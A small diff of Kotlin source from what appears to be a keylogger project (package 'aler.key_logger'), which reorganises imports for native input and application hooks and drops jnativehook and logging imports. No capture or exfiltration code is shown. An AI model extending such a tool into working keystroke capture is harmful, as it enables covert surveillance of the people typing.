@@ -20,12 +20,9 @@
 
 package aler.key_logger
 
-import aler.key_logger.hook.ApplicationHook
-import aler.key_logger.hook.NativeHook
+import aler.key_logger.hooks.application.ApplicationHook
+import aler.key_logger.hooks.input.NativeHook
 import aler.key_logger.server.LoggerServer
-import org.jnativehook.GlobalScreen
-import java.util.logging.Level
-import java.util.logging.Logger
 
 val nativehook = NativeHook()
 val appshook = ApplicationHook()
